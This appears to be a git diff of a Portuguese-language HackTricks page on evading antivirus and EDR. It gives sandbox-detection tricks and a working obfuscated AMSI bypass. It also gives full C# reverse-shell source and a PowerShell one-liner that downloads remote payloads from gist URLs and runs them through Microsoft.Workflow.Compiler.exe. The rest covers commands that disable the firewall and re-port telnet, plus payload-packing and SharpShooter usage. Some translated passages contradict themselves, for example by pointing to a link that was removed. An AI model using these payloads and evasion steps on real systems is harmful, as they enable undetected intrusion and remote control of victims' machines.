@@ -5,7 +5,7 @@
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
@@ -44,9 +44,9 @@ Recomendo muito que você confira esta [playlist do YouTube](https://www.youtube
 
 A análise dinâmica ocorre quando o AV executa seu binário em uma sandbox e observa a atividade maliciosa (por exemplo, tentando descriptografar e ler as senhas do seu navegador, realizando um minidespejo em LSASS, etc.). Essa parte pode ser um pouco mais complicada de trabalhar, mas aqui estão algumas coisas que você pode fazer para evitar as sandboxes.
 
-* **Atraso antes da execução** Dependendo de como é implementado, pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, portanto, o uso de longos atrasos pode perturbar a análise de binários. O problema é que muitas sandboxes AV podem simplesmente ignorar o atraso, dependendo de como ele é implementado.
-* **Verificação dos recursos da máquina** Geralmente, as sandboxes têm muito poucos recursos para trabalhar (por exemplo, <2 GB de RAM), caso contrário, elas podem desacelerar a máquina do usuário. Você também pode ser muito criativo aqui, por exemplo, verificando a temperatura da CPU ou até mesmo as velocidades do ventilador, nem tudo será implementado na sandbox.
-* **Verificações específicas da máquina** Se você deseja segmentar um usuário cuja estação de trabalho está associada ao domínio "contoso.local", pode verificar o domínio do computador para ver se ele corresponde ao que você especificou. Se não corresponder, você pode fazer seu programa sair.
+* **Atraso antes da execução** Dependendo de como é implementado, pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, portanto, o uso de longos atrasos pode perturbar a análise de binários. O problema é que muitas sandboxes de AV podem simplesmente ignorar o atraso, dependendo de como ele é implementado.
+* **Verificação dos recursos da máquina** Geralmente, as sandboxes têm muito poucos recursos para trabalhar (por exemplo, <2 GB de RAM), caso contrário, podem desacelerar a máquina do usuário. Você também pode ser muito criativo aqui, por exemplo, verificando a temperatura da CPU ou até mesmo as velocidades do ventilador, nem tudo será implementado na sandbox.
+* **Verificações específicas da máquina** Se você deseja segmentar um usuário cuja estação de trabalho está conectada ao domínio "contoso.local", pode verificar o domínio do computador para ver se ele corresponde ao que você especificou, se não corresponder, você pode fazer seu programa sair.
 
 Acontece que o nome do computador da Sandbox do Microsoft Defender é HAL9TH, então você pode verificar o nome do computador em seu malware antes da detonação, se o nome corresponder a HAL9TH, significa que você está dentro da sandbox do Defender, então você pode fazer seu programa sair.
 
@@ -58,21 +58,34 @@ Algumas outras dicas muito boas de [@mgeeky](https://twitter.com/mariuszbit) par
 
 Como dissemos antes neste post, **ferramentas públicas** eventualmente **serão detectadas**, então, você deve se perguntar algo:
 
-Por exemplo, se você deseja despejar LSASS, **você realmente precisa usar o mimikatz**? Ou você poderia usar um projeto diferente que é menos conhecido e também despeja LSASS.
+Por exemplo, se você deseja despejar o LSASS, **você realmente precisa usar o mimikatz**? Ou você poderia usar um projeto diferente que é menos conhecido e também despeja o LSASS.
 
-A resposta certa provavelmente é a última. Tomando o mimikatz como exemplo, provavelmente é um dos, senão o malware mais marcado pelos AVs e EDRs, enquanto o projeto em si é super legal, também é um pesadelo trabalhar com ele para contornar os AVs, então basta procurar alternativas para o que você está tentando alcançar.
+A resposta certa provavelmente é a última. Tomando o mimikatz como exemplo, é provavelmente um dos, senão o malware mais marcado pelos AVs e EDRs, enquanto o projeto em si é super legal, também é um pesadelo trabalhar com ele para contornar os AVs, então basta procurar alternativas para o que você está tentando alcançar.
 
 {% hint style="info" %}
 Ao modificar seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no defender e, por favor, seriamente, **NÃO FAÇA UPLOAD PARA O VIRUSTOTAL** se seu objetivo é alcançar a evasão a longo prazo. Se você quiser verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras e teste-o lá até ficar satisfeito com o resultado.
 {% endhint %}
-
 ## EXEs vs DLLs
 
-Sempre que possível, **priorize o uso
+Sempre que possível, **priorize o uso de DLLs para evasão**, em minha experiência, arquivos DLL são geralmente **muito menos detectados** e analisados, então é um truque muito simples de usar para evitar detecção em alguns casos (se o seu payload tiver alguma maneira de ser executado como uma DLL, é claro).
+
+Como podemos ver nesta imagem, um Payload DLL do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.
+
+<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>comparação do antiscan.me de um payload Havoc EXE normal vs um Havoc DLL normal</p></figcaption></figure>
+
+Agora mostraremos alguns truques que você pode usar com arquivos DLL para ser muito mais furtivo.
+
+## DLL Sideloading & Proxying
+
+**DLL Sideloading** aproveita a ordem de pesquisa de DLL usada pelo carregador, posicionando tanto o aplicativo vítima quanto as cargas maliciosas lado a lado.
+
+Você pode verificar programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte script do powershell:
+
+{% code overflow="wrap" %}
 ```powershell
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
-    $binarytoCheck = "C:\Program Files\" + $_
-    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
+$binarytoCheck = "C:\Program Files\" + $_
+C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
 }
 ```
 {% endcode %}
@@ -165,7 +178,7 @@ Existem algumas maneiras de contornar o AMSI:
 
 Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa maneira de evitar a detecção.
 
-No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenha várias camadas, então a ofuscação pode ser uma opção ruim dependendo de como é feita. Isso torna não tão direto para evitar. Embora, às vezes, tudo o que você precisa fazer é mudar alguns nomes de variáveis e você estará bem, então depende de quanto algo foi sinalizado.
+No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenha várias camadas, então a ofuscação pode ser uma má opção dependendo de como é feita. Isso torna não tão direto para evitar. Embora, às vezes, tudo o que você precisa fazer é mudar alguns nomes de variáveis e você estará bem, então depende de quanto algo foi sinalizado.
 
 * **Bypass AMSI**
 
@@ -182,16 +195,16 @@ Tudo o que foi necessário foi uma linha de código powershell para tornar o AMS
 Aqui está um bypass modificado do AMSI que eu peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
 ```powershell
 Try{#Ams1 bypass technic nº 2
-      $Xdatabase = 'Utils';$Homedrive = 'si'
-      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
-      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
-      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
-      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
-      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
-      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
-      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
-      $Spotfix.SetValue($null,$true)
-   }Catch{Throw $_}
+$Xdatabase = 'Utils';$Homedrive = 'si'
+$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
+$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
+$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
+$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
+$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
+$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
+$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
+$Spotfix.SetValue($null,$true)
+}Catch{Throw $_}
 ```
 Tenha em mente que isso provavelmente será detectado assim que este post for publicado, então você não deve publicar nenhum código se seu plano é permanecer indetectável.
 
@@ -239,7 +252,7 @@ O SmartScreen funciona principalmente com uma abordagem baseada em reputação, 
 
 Uma maneira muito eficaz de evitar que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de contêiner como um ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **não NTFS**.
 
-<figure><img src="../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evitar o Mark-of-the-Web.
 
@@ -248,20 +261,20 @@ Exemplo de uso:
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
 +      o     +              o   +      o     +              o
-    +             o     +           +             o     +         +
-    o  +           +        +           o  +           +          o
++             o     +           +             o     +         +
+o  +           +        +           o  +           +          o
 -_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
-   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
-   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
+:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
+for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
 -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
 +      o         o   +       o       +      o         o   +       o
 +      o            +      o    ~   Mariusz Banach / mgeeky    o
 o      ~     +           ~          <mb [at] binary-offensive.com>
-    o           +                         o           +           +
+o           +                         o           +           +
 
 [.] Packaging input file to output .iso (iso)...
 Burning file onto ISO:
-    Adding file: /TotallyLegitApp.exe
+Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
@@ -331,7 +344,7 @@ sc config TlntSVR start= auto obj= localsystem
 ```
 **Alterar a porta do telnet** (stealth) e desativar o firewall:
 
-Para evitar a detecção de um ataque, é possível alterar a porta padrão do telnet para uma porta diferente. Isso dificulta a detecção do ataque por meio de ferramentas de monitoramento de rede. Além disso, desativar o firewall pode permitir que o ataque seja executado sem ser bloqueado pelo firewall.
+Para evitar a detecção de um ataque, é possível alterar a porta padrão do serviço Telnet para uma porta diferente. Isso dificulta a detecção do serviço pelos administradores de rede e pelos sistemas de detecção de intrusão. Além disso, desativar o firewall pode permitir que o atacante tenha acesso mais fácil ao sistema alvo.
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
@@ -378,7 +391,7 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-Agora **inicie o listener** com `msfconsole -r file.rc` e **execute** o **payload xml** com:
+Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **payload xml** com:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
@@ -412,77 +425,87 @@ using System.Net.Sockets;
 
 namespace ConnectBack
 {
-	public class Program
-	{
-		static StreamWriter streamWriter;
+public class Program
+{
+static StreamWriter streamWriter;
 
-		public static void Main(string[] args)
-		{
-			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
-			{
-				using(Stream stream = client.GetStream())
-				{
-					using(StreamReader rdr = new StreamReader(stream))
-					{
-						streamWriter = new StreamWriter(stream);
-						
-						StringBuilder strInput = new StringBuilder();
+public static void Main(string[] args)
+{
+using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
+{
+using(Stream stream = client.GetStream())
+{
+using(StreamReader rdr = new StreamReader(stream))
+{
+streamWriter = new StreamWriter(stream);
 
-						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
-						p.StartInfo.CreateNoWindow = true;
-						p.StartInfo.UseShellExecute = false;
-						p.StartInfo.RedirectStandardOutput = true;
-						p.StartInfo.RedirectStandardInput = true;
-						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-						p.Start();
-						p.BeginOutputReadLine();
+StringBuilder strInput = new StringBuilder();
 
-						while(true)
-						{
-							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
-							p.StandardInput.WriteLine(strInput);
-							strInput.Remove(0, strInput.Length);
-						}
-					}
-				}
-			}
-		}
+Process p = new Process();
+p.StartInfo.FileName = "cmd.exe";
+p.StartInfo.CreateNoWindow = true;
+p.StartInfo.UseShellExecute = false;
+p.StartInfo.RedirectStandardOutput = true;
+p.StartInfo.RedirectStandardInput = true;
+p.StartInfo.RedirectStandardError = true;
+p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+p.Start();
+p.BeginOutputReadLine();
 
-		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
-        {
-            StringBuilder strOutput = new StringBuilder();
+while(true)
+{
+strInput.Append(rdr.ReadLine());
+//strInput.Append("\n");
+p.StandardInput.WriteLine(strInput);
+strInput.Remove(0, strInput.Length);
+}
+}
+}
+}
+}
 
-            if (!String.IsNullOrEmpty(outLine.Data))
-            {
-                try
-                {
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
-                    streamWriter.Flush();
-                }
-                catch (Exception err) { }
-            }
-        }
+private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+{
+StringBuilder strOutput = new StringBuilder();
 
-	}
+if (!String.IsNullOrEmpty(outLine.Data))
+{
+try
+{
+strOutput.Append(outLine.Data);
+streamWriter.WriteLine(strOutput);
+streamWriter.Flush();
+}
+catch (Exception err) { }
+}
+}
+
+}
 }
 ```
 ### C# usando compilador
 
-Este método envolve o uso do compilador C# para compilar um código malicioso em um arquivo executável. O arquivo executável pode ser executado em um sistema Windows sem a necessidade de instalar o .NET Framework. O código malicioso é um shell reverso simples que se conecta a um servidor remoto e permite que um invasor execute comandos no sistema comprometido. O código-fonte completo pode ser encontrado no seguinte link: [https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)
+Este método envolve o uso do compilador C# para compilar um código malicioso em um arquivo executável. O arquivo executável pode ser executado em um sistema Windows sem a necessidade de instalar o .NET Framework. O código malicioso é um shell reverso simples que se conecta a um servidor remoto controlado pelo invasor.
+
+O código-fonte do shell reverso está disponível no link acima. Para compilar o código, siga as etapas abaixo:
+
+1. Abra o prompt de comando do Windows.
+2. Navegue até o diretório onde o arquivo Simple_Rev_Shell.cs está salvo.
+3. Execute o seguinte comando para compilar o código:
+
+```
+csc.exe /out:Simple_Rev_Shell.exe Simple_Rev_Shell.cs
+```
+
+4. O arquivo executável Simple_Rev_Shell.exe será criado no mesmo diretório.
+
+O invasor pode então enviar o arquivo executável para a vítima e executá-lo no sistema Windows da vítima. O shell reverso se conectará ao servidor remoto controlado pelo invasor, permitindo que o invasor execute comandos no sistema da vítima.
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
 Download e execução automática:
 
-O objetivo dessa técnica é fazer com que o usuário execute um arquivo malicioso sem perceber. Para isso, o atacante pode usar um arquivo legítimo como isca e injetar o código malicioso nele. Quando o usuário executa o arquivo, o código malicioso é executado junto com o código legítimo.
-
-O arquivo REV.txt contém o código malicioso que será injetado no arquivo legítimo. Já o arquivo REV.shell é o arquivo legítimo que será usado como isca. O código malicioso é injetado no arquivo legítimo usando a técnica de "concatenação de arquivos". 
-
-Para automatizar o download e a execução do arquivo malicioso, o atacante pode usar técnicas como phishing, engenharia social ou exploração de vulnerabilidades em softwares desatualizados.
+O objetivo dessa técnica é fazer o download e execução automática de um arquivo malicioso sem que o usuário perceba. Para isso, é utilizado um arquivo REV.txt que contém um script PowerShell que faz o download do arquivo malicioso REV.shell e o executa. O script é executado através do comando "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NoLogo -Command" que permite a execução do script sem que o usuário perceba. É importante ressaltar que essa técnica pode ser detectada por antivírus que possuem proteção contra download e execução automática de arquivos.
 ```csharp
 64bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
@@ -522,16 +545,16 @@ https://www.shellterproject.com/download/
 
 # Sharpshooter
 # https://github.com/mdsecactivebreach/SharpShooter
-# Javascript Payload Stageless: 
+# Javascript Payload Stageless:
 SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
 
-# Stageless HTA Payload: 
+# Stageless HTA Payload:
 SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
 
 # Staged VBS:
 SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
 
-# Donut: 
+# Donut:
 https://github.com/TheWover/donut
 
 # Vulcan
